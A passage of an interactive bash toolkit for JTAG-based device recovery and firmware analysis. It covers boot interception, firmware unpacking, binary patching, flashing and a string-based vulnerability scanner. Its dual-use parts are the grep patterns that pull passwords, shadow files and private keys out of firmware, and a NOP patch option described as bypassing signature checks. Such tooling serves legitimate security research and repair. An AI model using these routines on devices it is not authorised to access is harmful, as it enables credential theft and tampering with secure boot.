                    echo "Monitor the serial console for boot messages."
                    log_message "INFO" "Device boot resumed after interception"

                    read -r -p "Press Enter to continue..."
                fi
                ;;
            9)
                # Power off device
                print_header
                echo "--- Power Off Device ---"
                echo
                echo "The device will remain halted via JTAG."
                echo "You can manually power off the device now."
                echo
                echo "OpenOCD will keep running. Use option 'b' to kill it."
                read -r -p "Press Enter to continue..."
                ;;
            b)
                # Kill OpenOCD and return
                print_header
                echo "--- Terminating OpenOCD ---"
                echo
                read -r -p "Kill OpenOCD and return to menu? (y/n): " kill_choice

                if [[ "$kill_choice" == "y" ]]; then
                    if kill -0 $openocd_pid 2>/dev/null; then
                        kill $openocd_pid 2>/dev/null
                        sleep 1
                        echo "OpenOCD terminated (PID: $openocd_pid)"
                        log_message "INFO" "OpenOCD terminated after boot interception session"
                    else
                        echo "OpenOCD process already terminated."
                    fi
                    break
                fi
                ;;
            *)
                echo "Invalid option."
                sleep 1
                ;;
        esac
    done
}

menu_jtag_cable_recovery() {
    while true; do
        print_header
        echo "--- JTAG Cable Assisted Recovery ---"
        echo "  Current Adapter: $JTAG_ADAPTER"
        echo "  Current Architecture: $TARGET_ARCH"
        echo
        echo "  1) Test JTAG Cable Connection"
        echo "  2) Detect JTAG TAPs & Diagnostics"
        echo "  3) Interactive OpenOCD Console"
        echo "  4) Automated Boot Interception (NEW)"
        echo "  5) JTAG Password Recovery"
        echo "  6) JTAG Bootloader Recovery"
        echo "  7) JTAG Memory Patching"
        echo "  8) Guided Recovery Wizard"
        echo "  b) Back to Main Menu"
        echo
        read -r -p "Choose an option: " choice

        case "$choice" in
            1) jtag_test_connection ;;
            2) jtag_detect_taps ;;
            3) jtag_interactive_console ;;
            4) jtag_auto_boot_interrupt ;;
            5) jtag_password_recovery ;;
            6) jtag_bootloader_recovery ;;
            7) jtag_memory_patch ;;
            8) jtag_recovery_wizard ;;
            b) break ;;
            *) echo "Invalid option." && sleep 1 ;;
        esac
    done
}

# --- Firmware Modification Workshop ---

firmware_unpack_analyze() {
    print_header
    echo "--- Firmware Unpacker & Analyzer ---"
    echo
    echo "This tool extracts and analyzes firmware images."
    echo

    if ! command -v binwalk &> /dev/null; then
        log_message "WARN" "binwalk not found."
        echo "WARNING: 'binwalk' is not installed. Some features may be limited."
        echo "Install with: sudo apt-get install binwalk"
        echo
    fi

    read -r -p "Enter firmware image path: " firmware_file

    if [ ! -f "$firmware_file" ]; then
        log_message "ERROR" "Firmware file not found: $firmware_file"
        echo "ERROR: File not found at '$firmware_file'."
        sleep 2
        return
    fi

    local fw_work_dir="${SESSION_DIR}/firmware_analysis"
    mkdir -p "$fw_work_dir"

    echo "Firmware file: $firmware_file"
    echo "Working directory: $fw_work_dir"
    echo
    echo "Analysis Options:"
    echo "  1) Quick analysis (file type, entropy)"
    echo "  2) Full extraction (binwalk -e)"
    echo "  3) Signature scan only"
    echo "  4) Extract filesystem and analyze"
    echo "  5) Search for embedded credentials"
    echo "  b) Back"
    echo
    read -r -p "Choose analysis type: " analysis_type

    case "$analysis_type" in
        1)
            echo
            echo "=== Quick Analysis ==="
            echo
            echo "File information:"
            file "$firmware_file"
            echo
            echo "File size: $(du -h "$firmware_file" | cut -f1)"
            echo

            if command -v binwalk &> /dev/null; then
                echo "Entropy analysis (checking for compression/encryption):"
                binwalk -E "$firmware_file" 2>&1 | tail -20
                echo
                echo "Signature scan:"
                binwalk "$firmware_file" | head -30
            fi
            ;;
        2)
            echo
            echo "Extracting firmware with binwalk..."
            cd "$fw_work_dir"

            if binwalk -e "$firmware_file" 2>&1 | tee extraction.log; then
                echo
                echo "SUCCESS: Firmware extracted to:"
                echo "$fw_work_dir"
                echo
                echo "Extracted contents:"
                ls -lh "$fw_work_dir"
                echo
                echo "Searching for filesystems..."
                find "$fw_work_dir" -type d -name "*filesystem*" -o -name "*rootfs*" -o -name "*squashfs-root*"
                log_message "INFO" "Firmware extracted to $fw_work_dir"
            else
                echo "ERROR: Extraction failed. Check extraction.log"
                log_message "ERROR" "Firmware extraction failed"
            fi
            cd - > /dev/null
            ;;
        3)
            echo
            echo "=== Signature Scan ==="
            binwalk "$firmware_file" | tee "${fw_work_dir}/signatures.txt"
            echo
            echo "Signatures saved to: ${fw_work_dir}/signatures.txt"
            ;;
        4)
            echo
            echo "Extracting and analyzing filesystem..."
            cd "$fw_work_dir"

            binwalk -e "$firmware_file" 2>&1 | tee extraction.log

            echo
            echo "Searching for filesystem directories..."
            local fs_dirs=$(find "$fw_work_dir" -type d \( -name "*filesystem*" -o -name "*rootfs*" -o -name "*squashfs-root*" \) | head -1)

            if [ -n "$fs_dirs" ]; then
                echo "Found filesystem: $fs_dirs"
                echo
                echo "=== Filesystem Analysis ==="
                echo
                echo "Directory structure:"
                ls -lh "$fs_dirs" | head -20
                echo
                echo "Searching for sensitive files..."
                find "$fs_dirs" -type f \( -name "*.conf" -o -name "*.cfg" -o -name "passwd" -o -name "shadow" -o -name "*.key" -o -name "*.pem" \) | head -20
                echo
                echo "Searching for scripts and binaries..."
                find "$fs_dirs" -type f \( -name "*.sh" -o -perm -111 \) | head -20

                log_message "INFO" "Filesystem analysis complete: $fs_dirs"
            else
                echo "No filesystem found in extraction."
            fi
            cd - > /dev/null
            ;;
        5)
            echo
            echo "=== Searching for Embedded Credentials ==="
            echo
            echo "Scanning for passwords, keys, and secrets..."
            strings "$firmware_file" | grep -iE '(password|passwd|pwd|secret|api_key|private_key|rsa|ssh|enable)' | head -50 | tee "${fw_work_dir}/credentials.txt"
            echo
            echo "Results saved to: ${fw_work_dir}/credentials.txt"
            log_message "INFO" "Credential scan complete"
            ;;
        b)
            return
            ;;
        *)
            echo "Invalid option."
            sleep 1
            return
            ;;
    esac

    echo
    read -r -p "Press Enter to continue..."
}

firmware_binary_patch() {
    print_header
    echo "--- Binary Firmware Patcher ---"
    echo
    echo "This tool allows you to patch firmware binaries."
    echo

    read -r -p "Enter firmware image path: " firmware_file

    if [ ! -f "$firmware_file" ]; then
        echo "ERROR: File not found at '$firmware_file'."
        sleep 2
        return
    fi

    local patched_file="${firmware_file}.patched"

    echo
    echo "Firmware: $firmware_file"
    echo "Patched output: $patched_file"
    echo
    echo "Patch Options:"
    echo "  1) Replace hex bytes at offset"
    echo "  2) Replace string"
    echo "  3) Patch out signature check (NOP specific bytes)"
    echo "  4) Apply custom binary patch file"
    echo "  5) Modify IP address/URL"
    echo "  b) Back"
    echo
    read -r -p "Choose patch type: " patch_type

    # Create working copy
    cp "$firmware_file" "$patched_file"

    case "$patch_type" in
        1)
            echo
            read -r -p "Enter hex offset (e.g., 0x1000 or 4096): " offset
            read -r -p "Enter hex bytes to write (e.g., 90 90 90 or 00 00): " hex_bytes

            # Convert hex offset if needed
            if [[ "$offset" =~ ^0x ]]; then
                offset=$((offset))
            fi

            echo "Writing bytes at offset $offset..."

            # Use xxd to patch
            echo "$hex_bytes" | xxd -r -p | dd of="$patched_file" bs=1 seek="$offset" conv=notrunc 2>&1

            if [ $? -eq 0 ]; then
                echo "SUCCESS: Firmware patched."
                echo "Patched file: $patched_file"
                log_message "INFO" "Binary patch applied at offset $offset"
            else
                echo "ERROR: Patch failed."
                log_message "ERROR" "Binary patch failed"
            fi
            ;;
        2)
            echo
            read -r -p "Enter string to find: " find_str
            read -r -p "Enter replacement string (same length recommended): " replace_str

            echo "Searching for string '$find_str'..."

            # Find offset of string
            local offset=$(grep -abo "$find_str" "$patched_file" | head -1 | cut -d: -f1)

            if [ -n "$offset" ]; then
                echo "Found at offset: $offset"
                echo "Replacing with: $replace_str"

                # Pad replacement if needed
                local find_len=${#find_str}
                local replace_len=${#replace_str}

                if [ $replace_len -lt $find_len ]; then
                    # Pad with nulls
                    replace_str="${replace_str}$(printf '\x00%.0s' $(seq 1 $((find_len - replace_len))))"
                    echo "Padded replacement to match original length"
                elif [ $replace_len -gt $find_len ]; then
                    echo "WARNING: Replacement is longer than original. Truncating."
                    replace_str="${replace_str:0:$find_len}"
                fi

                printf "%s" "$replace_str" | dd of="$patched_file" bs=1 seek="$offset" conv=notrunc 2>&1

                echo "SUCCESS: String replaced."
                log_message "INFO" "String patch applied: $find_str -> $replace_str"
            else
                echo "ERROR: String not found in firmware."
            fi
            ;;
        3)
            echo
            echo "This will replace specified bytes with NOP instructions (0x90 for x86, 0x00 for ARM)"
            echo
            read -r -p "Enter offset to NOP (hex, e.g., 0x1000): " nop_offset
            read -r -p "Enter number of bytes to NOP: " nop_count
            read -r -p "NOP byte value (0x90 for x86, 0x00 for ARM) [90]: " nop_byte
            nop_byte=${nop_byte:-90}

            # Convert offset
            if [[ "$nop_offset" =~ ^0x ]]; then
                nop_offset=$((nop_offset))
            fi

            echo "NOPing $nop_count bytes at offset $nop_offset with 0x$nop_byte..."

            # Create NOP sequence
            yes "$nop_byte" | head -n "$nop_count" | xxd -r -p | dd of="$patched_file" bs=1 seek="$nop_offset" conv=notrunc 2>&1

            echo "SUCCESS: Bytes NOPed."
            echo "This may bypass signature checks if applied correctly."
            log_message "INFO" "NOP patch applied at $nop_offset ($nop_count bytes)"
            ;;
        4)
            echo
            read -r -p "Enter patch file path (binary diff): " patch_file

            if [ ! -f "$patch_file" ]; then
                echo "ERROR: Patch file not found."
                sleep 2
                return
            fi

            read -r -p "Enter offset to apply patch: " patch_offset

            if [[ "$patch_offset" =~ ^0x ]]; then
                patch_offset=$((patch_offset))
            fi

            echo "Applying patch..."
            dd if="$patch_file" of="$patched_file" bs=1 seek="$patch_offset" conv=notrunc 2>&1

            echo "SUCCESS: Patch applied."
            log_message "INFO" "Custom patch applied from $patch_file"
            ;;
        5)
            echo
            read -r -p "Enter IP/URL to find: " find_ip
            read -r -p "Enter new IP/URL: " replace_ip

            # Ensure same length
            if [ ${#find_ip} -ne ${#replace_ip} ]; then
                echo "WARNING: Strings are different lengths. Padding/truncating..."
                if [ ${#replace_ip} -lt ${#find_ip} ]; then
                    replace_ip=$(printf "%-${#find_ip}s" "$replace_ip")
                else
                    replace_ip="${replace_ip:0:${#find_ip}}"
                fi
            fi

            echo "Searching for '$find_ip'..."
            local offset=$(grep -abo "$find_ip" "$patched_file" | head -1 | cut -d: -f1)

            if [ -n "$offset" ]; then
                echo "Found at offset: $offset"
                printf "%s" "$replace_ip" | dd of="$patched_file" bs=1 seek="$offset" conv=notrunc 2>&1
                echo "SUCCESS: IP/URL modified."
                log_message "INFO" "IP/URL patch: $find_ip -> $replace_ip"
            else
                echo "ERROR: IP/URL not found."
            fi
            ;;
        b)
            return
            ;;
        *)
            echo "Invalid option."
            sleep 1
            return
            ;;
    esac

    echo
    echo "Patched firmware saved to: $patched_file"
    echo "Original firmware unchanged: $firmware_file"
    echo
    read -r -p "Press Enter to continue..."
}

firmware_flash_workflow() {
    print_header
    echo "--- Firmware Flash Workflow ---"
    echo
    echo "This workflow guides you through flashing modified firmware."
    echo

    echo "Workflow:"
    echo "  1. Dump current firmware (backup)"
    echo "  2. Modify firmware (patch/customize)"
    echo "  3. Flash modified firmware via JTAG"
    echo "  4. Monitor boot and verify"
    echo
    echo "Current Status:"
    echo "  Platform: $PLATFORM"
    echo "  JTAG Adapter: $JTAG_ADAPTER"
    echo "  Architecture: $TARGET_ARCH"
    echo
    echo "Options:"
    echo "  1) Start full workflow (dump → modify → flash)"
    echo "  2) Dump current firmware only"
    echo "  3) Flash pre-modified firmware"
    echo "  4) Quick patch and flash"
    echo "  b) Back"
    echo
    read -r -p "Choose option: " workflow_choice

    case "$workflow_choice" in
        1)
            echo
            echo "=== Step 1: Dump Current Firmware ==="
            echo "First, let's backup the current firmware..."
            read -r -p "Press Enter to dump firmware via JTAG..."

            exploit_via_jtag "extract_flash"

            echo
            echo "=== Step 2: Modify Firmware ==="
            read -r -p "Ready to modify firmware? (y/n): " ready_modify

            if [[ "$ready_modify" == "y" ]]; then
                firmware_binary_patch
            fi

            echo
            echo "=== Step 3: Flash Modified Firmware ==="
            read -r -p "Ready to flash modified firmware? (y/n): " ready_flash

            if [[ "$ready_flash" == "y" ]]; then
                jtag_flash_write
            fi

            echo
            echo "Workflow complete. Monitor serial console for boot messages."
            ;;
        2)
            exploit_via_jtag "extract_flash"
            ;;
        3)
            echo
            echo "Flashing pre-modified firmware..."
            jtag_flash_write
            ;;
        4)
            echo
            echo "Quick patch workflow:"
            echo "This will prompt for a simple patch, then flash immediately."
            echo
            read -r -p "Enter firmware to patch: " quick_fw

            if [ ! -f "$quick_fw" ]; then
                echo "ERROR: File not found."
                sleep 2
                return
            fi

            # Quick string replacement
            read -r -p "Enter string to replace: " quick_find
            read -r -p "Enter replacement: " quick_replace

            local quick_patched="${quick_fw}.quick_patched"
            cp "$quick_fw" "$quick_patched"

            local offset=$(grep -abo "$quick_find" "$quick_patched" | head -1 | cut -d: -f1)
            if [ -n "$offset" ]; then
                printf "%s" "$quick_replace" | dd of="$quick_patched" bs=1 seek="$offset" conv=notrunc 2>&1
                echo "Patched! Now flashing..."
                echo

                # Flash it
                jtag_flash_write
            else
                echo "ERROR: String not found."
            fi
            ;;
        b)
            return
            ;;
        *)
            echo "Invalid option."
            sleep 1
            ;;
    esac

    echo
    read -r -p "Press Enter to continue..."
}

menu_firmware_workshop() {
    while true; do
        print_header
        echo "--- Firmware Modification Workshop ---"
        echo
        echo "  1) Firmware Unpacker & Analyzer"
        echo "  2) Binary Firmware Patcher"
        echo "  3) Firmware Flash Workflow (Dump → Modify → Flash)"
        echo "  4) Extract from Halted Device (Boot Intercept Integration)"
        echo "  b) Back to Main Menu"
        echo
        read -r -p "Choose an option: " choice

        case "$choice" in
            1) firmware_unpack_analyze ;;
            2) firmware_binary_patch ;;
            3) firmware_flash_workflow ;;
            4)
                echo
                echo "This option requires boot interception to be active."
                echo "Use: Main Menu → JTAG Cable Assisted Recovery → Automated Boot Interception"
                echo "Then use option 3 (Dump Firmware/Flash) from the post-interrupt menu."
                read -r -p "Press Enter to continue..."
                ;;
            b) break ;;
            *) echo "Invalid option." && sleep 1 ;;
        esac
    done
}

# --- End Firmware Modification Workshop ---

# --- Advanced Firmware Analysis Suite ---

firmware_automated_teardown() {
    print_header
    echo "=== Automated Firmware Teardown Analyzer ==="
    echo
    echo "This performs a comprehensive automated analysis of firmware:"
    echo "  - File type and format identification"
    echo "  - Entropy analysis (detect encryption/compression)"
    echo "  - String extraction and categorization"
    echo "  - Function signature detection"
    echo "  - Embedded file detection"
    echo "  - Architecture detection"
    echo

    read -r -p "Enter path to firmware file: " firmware_file

    if [ ! -f "$firmware_file" ]; then
        echo "ERROR: File not found: $firmware_file"
        read -r -p "Press Enter to continue..."
        return 1
    fi

    local output_dir="${SESSION_DIR}/teardown_$(basename "$firmware_file")"
    mkdir -p "$output_dir"

    log_message "INFO" "Starting automated firmware teardown: $firmware_file"

    echo
    echo ">>> Step 1/6: File Identification"
    echo "-----------------------------------"
    if command -v file &> /dev/null; then
        file "$firmware_file" | tee "$output_dir/file_type.txt"
    else
        echo "WARNING: 'file' command not available"
    fi

    echo
    echo ">>> Step 2/6: Entropy Analysis"
    echo "-------------------------------"
    if command -v binwalk &> /dev/null; then
        echo "Analyzing entropy (high entropy = encrypted/compressed)..."
        binwalk -E "$firmware_file" 2>&1 | tee "$output_dir/entropy.txt"
    else
        echo "WARNING: binwalk not available, skipping entropy analysis"
    fi

    echo
    echo ">>> Step 3/6: String Extraction & Categorization"
    echo "------------------------------------------------"
    if command -v strings &> /dev/null; then
        local strings_file="$output_dir/all_strings.txt"
        echo "Extracting readable strings..."
        strings "$firmware_file" > "$strings_file"
        local total_strings=$(wc -l < "$strings_file")
        echo "  Total strings found: $total_strings"

        # Categorize interesting strings
        echo
        echo "Categorizing interesting patterns:"

        # URLs and IPs
        grep -Ei '(https?://|ftp://|[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3})' "$strings_file" > "$output_dir/urls_ips.txt" 2>/dev/null
        local url_count=$(wc -l < "$output_dir/urls_ips.txt" 2>/dev/null || echo 0)
        echo "  URLs/IPs: $url_count found → $output_dir/urls_ips.txt"

        # Passwords and credentials
        grep -Ei '(password|passwd|pwd|secret|key|token|api|auth|credential)' "$strings_file" > "$output_dir/credentials.txt" 2>/dev/null
        local cred_count=$(wc -l < "$output_dir/credentials.txt" 2>/dev/null || echo 0)
        echo "  Credential patterns: $cred_count found → $output_dir/credentials.txt"

        # File paths
        grep -E '^(/[a-zA-Z0-9_\-./]+|[A-Z]:\\)' "$strings_file" > "$output_dir/paths.txt" 2>/dev/null
        local path_count=$(wc -l < "$output_dir/paths.txt" 2>/dev/null || echo 0)
        echo "  File paths: $path_count found → $output_dir/paths.txt"

        # Version strings
        grep -Ei '(version|v[0-9]+\.[0-9]+|build|release)' "$strings_file" > "$output_dir/versions.txt" 2>/dev/null
        local ver_count=$(wc -l < "$output_dir/versions.txt" 2>/dev/null || echo 0)
        echo "  Version strings: $ver_count found → $output_dir/versions.txt"

        # Email addresses
        grep -Ei '[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}' "$strings_file" > "$output_dir/emails.txt" 2>/dev/null
        local email_count=$(wc -l < "$output_dir/emails.txt" 2>/dev/null || echo 0)
        echo "  Email addresses: $email_count found → $output_dir/emails.txt"
    else
        echo "WARNING: 'strings' command not available"
    fi

    echo
    echo ">>> Step 4/6: Function Signature Detection"
    echo "------------------------------------------"
    if command -v strings &> /dev/null; then
        # Look for common function patterns and symbols
        local symbols_file="$output_dir/function_signatures.txt"
        echo "Searching for function signatures..."

        # Common function prefixes/patterns
        strings "$firmware_file" | grep -E '^[a-zA-Z_][a-zA-Z0-9_]*\(' > "$symbols_file" 2>/dev/null || true
        strings "$firmware_file" | grep -Ei '(main|init|setup|boot|start|exit|printf|scanf|malloc|free)' >> "$symbols_file" 2>/dev/null || true

        local func_count=$(sort -u "$symbols_file" | wc -l 2>/dev/null || echo 0)
        echo "  Function-like symbols: $func_count unique patterns found"
        echo "  → $symbols_file"

        # Look for common library indicators
        echo
        echo "Library/Framework Detection:"
        strings "$firmware_file" | grep -Ei '(openssl|libc|glibc|uclibc|busybox|dropbear|openssh|u-boot)' | sort -u | head -20
    else
        echo "WARNING: 'strings' command not available"
    fi

    echo
    echo ">>> Step 5/6: Embedded File Detection"
    echo "--------------------------------------"
    if command -v binwalk &> /dev/null; then
        echo "Scanning for embedded files and filesystems..."
        binwalk "$firmware_file" 2>&1 | tee "$output_dir/embedded_files.txt"
    else
        echo "WARNING: binwalk not available"
    fi

    echo
    echo ">>> Step 6/6: Architecture Detection"
    echo "-------------------------------------"
    if command -v binwalk &> /dev/null; then
        echo "Detecting CPU architecture..."
        binwalk -A "$firmware_file" 2>&1 | head -30 | tee "$output_dir/architecture.txt"
    else
        echo "WARNING: binwalk not available for architecture detection"
        echo "Attempting basic heuristic detection..."
        if strings "$firmware_file" | grep -qi 'arm'; then
            echo "  Potential ARM architecture detected (ARM strings found)"
        fi
        if strings "$firmware_file" | grep -qi 'mips'; then
            echo "  Potential MIPS architecture detected (MIPS strings found)"
        fi
        if strings "$firmware_file" | grep -qi 'x86\|i386\|i686'; then
            echo "  Potential x86 architecture detected (x86 strings found)"
        fi
    fi

    echo
    echo "========================================="
    echo "Teardown Complete!"
    echo "========================================="
    echo "All results saved to: $output_dir"
    echo
    echo "Summary:"
    echo "  - File type: $(head -1 "$output_dir/file_type.txt" 2>/dev/null || echo 'N/A')"
    echo "  - Analysis directory: $output_dir"
    echo

    log_message "INFO" "Firmware teardown completed: $output_dir"

    read -r -p "Press Enter to continue..."
}

firmware_binary_diff() {
    print_header
    echo "=== Binary Firmware Differ ==="
    echo
    echo "Compare two firmware versions to identify changes:"
    echo "  - Byte-level differences"
    echo "  - Added/removed strings"
    echo "  - Changed functions"
    echo "  - Modified embedded files"
    echo

    read -r -p "Enter path to ORIGINAL firmware: " fw1
    read -r -p "Enter path to MODIFIED firmware: " fw2

    if [ ! -f "$fw1" ]; then
        echo "ERROR: Original firmware not found: $fw1"
        read -r -p "Press Enter to continue..."
        return 1
    fi

    if [ ! -f "$fw2" ]; then
        echo "ERROR: Modified firmware not found: $fw2"
        read -r -p "Press Enter to continue..."
        return 1
    fi

    local diff_dir="${SESSION_DIR}/diff_$(date +%s)"
    mkdir -p "$diff_dir"

    log_message "INFO" "Starting firmware binary diff: $fw1 vs $fw2"

    echo
    echo ">>> Step 1/5: File Size Comparison"
    echo "-----------------------------------"
    local size1=$(stat -c%s "$fw1" 2>/dev/null || stat -f%z "$fw1" 2>/dev/null)
    local size2=$(stat -c%s "$fw2" 2>/dev/null || stat -f%z "$fw2" 2>/dev/null)
    echo "  Original: $size1 bytes"
    echo "  Modified: $size2 bytes"
    echo "  Difference: $((size2 - size1)) bytes"

    echo
    echo ">>> Step 2/5: Checksum Comparison"
    echo "----------------------------------"
    if command -v md5sum &> /dev/null; then
        echo "  Original MD5: $(md5sum "$fw1" | awk '{print $1}')"
        echo "  Modified MD5: $(md5sum "$fw2" | awk '{print $1}')"
    fi
    if command -v sha256sum &> /dev/null; then
        echo "  Original SHA256: $(sha256sum "$fw1" | awk '{print $1}')"
        echo "  Modified SHA256: $(sha256sum "$fw2" | awk '{print $1}')"
    fi

    echo
    echo ">>> Step 3/5: String Differences"
    echo "---------------------------------"
    if command -v strings &> /dev/null; then
        echo "Extracting strings from both files..."
        strings "$fw1" | sort -u > "$diff_dir/strings_fw1.txt"
        strings "$fw2" | sort -u > "$diff_dir/strings_fw2.txt"

        echo "Computing differences..."

        # Strings only in fw1 (removed)
        comm -23 "$diff_dir/strings_fw1.txt" "$diff_dir/strings_fw2.txt" > "$diff_dir/strings_removed.txt"
        local removed_count=$(wc -l < "$diff_dir/strings_removed.txt")

        # Strings only in fw2 (added)
        comm -13 "$diff_dir/strings_fw1.txt" "$diff_dir/strings_fw2.txt" > "$diff_dir/strings_added.txt"
        local added_count=$(wc -l < "$diff_dir/strings_added.txt")

        echo "  Removed strings: $removed_count → $diff_dir/strings_removed.txt"
        echo "  Added strings: $added_count → $diff_dir/strings_added.txt"

        if [ "$added_count" -gt 0 ]; then
            echo
            echo "Sample of added strings (first 20):"
            head -20 "$diff_dir/strings_added.txt" | sed 's/^/    /'
        fi
    else
        echo "WARNING: 'strings' command not available"
    fi

    echo
    echo ">>> Step 4/5: Binary Hex Diff"
    echo "------------------------------"
    if command -v xxd &> /dev/null && command -v diff &> /dev/null; then
        echo "Generating hexdump diff (this may take a while for large files)..."
        xxd "$fw1" > "$diff_dir/hex_fw1.txt" 2>/dev/null &
        local pid1=$!
        xxd "$fw2" > "$diff_dir/hex_fw2.txt" 2>/dev/null &
        local pid2=$!

        wait $pid1 $pid2

        diff -u "$diff_dir/hex_fw1.txt" "$diff_dir/hex_fw2.txt" > "$diff_dir/hex_diff.txt" 2>/dev/null || true

        local diff_lines=$(wc -l < "$diff_dir/hex_diff.txt" 2>/dev/null || echo 0)
        echo "  Hex diff generated: $diff_lines lines → $diff_dir/hex_diff.txt"

        # Count changed bytes
        local changed_bytes=$(grep -c '^[<>]' "$diff_dir/hex_diff.txt" 2>/dev/null || echo 0)
        echo "  Approximate changed regions: $changed_bytes"
    else
        echo "WARNING: xxd or diff not available for hex comparison"
    fi

    echo
    echo ">>> Step 5/5: Embedded File Comparison"
    echo "---------------------------------------"
    if command -v binwalk &> /dev/null; then
        echo "Scanning for embedded files in both firmwares..."
        binwalk "$fw1" > "$diff_dir/binwalk_fw1.txt" 2>&1
        binwalk "$fw2" > "$diff_dir/binwalk_fw2.txt" 2>&1

        echo "  Original embedded files:"
        grep -c 'DECIMAL' "$diff_dir/binwalk_fw1.txt" 2>/dev/null || echo "  0"
        echo "  Modified embedded files:"
        grep -c 'DECIMAL' "$diff_dir/binwalk_fw2.txt" 2>/dev/null || echo "  0"
        echo
        echo "  See detailed binwalk output:"
        echo "    $diff_dir/binwalk_fw1.txt"
        echo "    $diff_dir/binwalk_fw2.txt"
    else
        echo "WARNING: binwalk not available"
    fi

    echo
    echo "========================================="
    echo "Binary Diff Complete!"
    echo "========================================="
    echo "All results saved to: $diff_dir"
    echo

    log_message "INFO" "Binary diff completed: $diff_dir"

    read -r -p "Press Enter to continue..."
}

firmware_vulnerability_scan() {
    print_header
    echo "=== Firmware Vulnerability Scanner ==="
    echo
    echo "Scans firmware for common security issues:"
    echo "  - Hardcoded credentials (passwords, keys, tokens)"
    echo "  - Dangerous function calls (strcpy, gets, system)"
    echo "  - Weak cryptographic algorithms (MD5, DES, RC4)"
    echo "  - Common CVE patterns"
    echo "  - Debug/backdoor strings"
    echo "  - Private keys and certificates"
    echo

    read -r -p "Enter path to firmware file: " firmware_file

    if [ ! -f "$firmware_file" ]; then
        echo "ERROR: File not found: $firmware_file"
        read -r -p "Press Enter to continue..."
        return 1
    fi

    local vuln_dir="${SESSION_DIR}/vulnscan_$(basename "$firmware_file")"
    mkdir -p "$vuln_dir"

    log_message "INFO" "Starting vulnerability scan: $firmware_file"

    echo
    echo ">>> Scan 1/7: Hardcoded Credentials"
    echo "------------------------------------"
    if command -v strings &> /dev/null; then
        echo "Searching for credential patterns..."
        local cred_file="$vuln_dir/credentials.txt"

        strings "$firmware_file" | grep -Ei '(password|passwd|pwd|secret|api_key|apikey|token|auth.*=|key.*=)' > "$cred_file" 2>/dev/null || true

        # Look for common default passwords
        strings "$firmware_file" | grep -Ei '(admin|root|cisco|default|12345|password123)' >> "$cred_file" 2>/dev/null || true

        local cred_count=$(sort -u "$cred_file" | wc -l 2>/dev/null || echo 0)
        echo "  ALERT: Found $cred_count potential credential strings"

        if [ "$cred_count" -gt 0 ]; then
            echo "  Sample findings (first 15):"
            sort -u "$cred_file" | head -15 | sed 's/^/    /'
            echo "  → Full list: $cred_file"
        fi
    else
        echo "WARNING: 'strings' command not available"
    fi

    echo
    echo ">>> Scan 2/7: Dangerous Functions"
    echo "----------------------------------"
    if command -v strings &> /dev/null; then
        echo "Searching for unsafe C functions..."
        local unsafe_file="$vuln_dir/unsafe_functions.txt"

        # Dangerous C functions
        strings "$firmware_file" | grep -Eo '\b(strcpy|strcat|sprintf|gets|scanf|vsprintf|system|popen|exec|eval)\b' > "$unsafe_file" 2>/dev/null || true

        local unsafe_count=$(sort -u "$unsafe_file" | wc -l 2>/dev/null || echo 0)

        if [ "$unsafe_count" -gt 0 ]; then
            echo "  WARNING: Found references to $unsafe_count dangerous functions:"
            sort -u "$unsafe_file" | sed 's/^/    - /'
            echo "  → $unsafe_file"
        else
            echo "  OK: No obvious dangerous function calls found"
        fi
    fi

    echo
    echo ">>> Scan 3/7: Weak Cryptography"
    echo "--------------------------------"
    if command -v strings &> /dev/null; then
        echo "Searching for weak crypto algorithms..."
        local crypto_file="$vuln_dir/weak_crypto.txt"

        strings "$firmware_file" | grep -Ei '\b(MD5|DES|RC4|SHA1|md5|des|rc4|sha1)\b' > "$crypto_file" 2>/dev/null || true

        local crypto_count=$(sort -u "$crypto_file" | wc -l 2>/dev/null || echo 0)

        if [ "$crypto_count" -gt 0 ]; then
            echo "  WARNING: Found $crypto_count references to weak crypto:"
            sort -u "$crypto_file" | head -10 | sed 's/^/    /'
            echo "  → $crypto_file"
        else
            echo "  OK: No obvious weak crypto references found"
        fi
    fi

    echo
    echo ">>> Scan 4/7: Private Keys & Certificates"
    echo "------------------------------------------"
    if command -v strings &> /dev/null; then
        echo "Searching for embedded keys..."
        local keys_file="$vuln_dir/private_keys.txt"

        strings "$firmware_file" | grep -E '(BEGIN.*PRIVATE KEY|BEGIN RSA PRIVATE KEY|BEGIN DSA PRIVATE KEY|BEGIN EC PRIVATE KEY|BEGIN CERTIFICATE)' > "$keys_file" 2>/dev/null || true

        local keys_count=$(wc -l < "$keys_file" 2>/dev/null || echo 0)

        if [ "$keys_count" -gt 0 ]; then
            echo "  CRITICAL: Found $keys_count embedded private keys/certificates!"
            cat "$keys_file" | sed 's/^/    /'
            echo "  → $keys_file"
        else
            echo "  OK: No PEM-formatted private keys found"
        fi
    fi

    echo
    echo ">>> Scan 5/7: Debug & Backdoor Strings"
    echo "---------------------------------------"
    if command -v strings &> /dev/null; then
        echo "Searching for debug/backdoor indicators..."
        local debug_file="$vuln_dir/debug_backdoor.txt"

        strings "$firmware_file" | grep -Ei '(debug|backdoor|test.*mode|admin.*mode|root.*shell|hidden|secret.*menu)' > "$debug_file" 2>/dev/null || true

        local debug_count=$(sort -u "$debug_file" | wc -l 2>/dev/null || echo 0)

        if [ "$debug_count" -gt 0 ]; then
            echo "  WARNING: Found $debug_count potential debug/backdoor strings"
            echo "  Sample findings (first 10):"
            sort -u "$debug_file" | head -10 | sed 's/^/    /'
            echo "  → $debug_file"
        else
            echo "  OK: No obvious debug/backdoor strings found"
        fi
    fi

    echo
    echo ">>> Scan 6/7: SQL Injection Patterns"
    echo "-------------------------------------"
    if command -v strings &> /dev/null; then
        echo "Searching for SQL query patterns..."
        local sql_file="$vuln_dir/sql_patterns.txt"

        strings "$firmware_file" | grep -Ei '(SELECT.*FROM|INSERT INTO|UPDATE.*SET|DELETE FROM|DROP TABLE|UNION SELECT)' > "$sql_file" 2>/dev/null || true

        local sql_count=$(wc -l < "$sql_file" 2>/dev/null || echo 0)

        if [ "$sql_count" -gt 0 ]; then
            echo "  INFO: Found $sql_count SQL query strings"
            echo "  Review for potential injection vulnerabilities"
            echo "  → $sql_file"
        else
            echo "  OK: No SQL patterns detected"
        fi
    fi

    echo
    echo ">>> Scan 7/7: Common CVE Patterns"
    echo "----------------------------------"
    if command -v strings &> /dev/null; then
        echo "Searching for known vulnerable components..."
        local cve_file="$vuln_dir/cve_patterns.txt"

        # Look for version strings of commonly vulnerable software
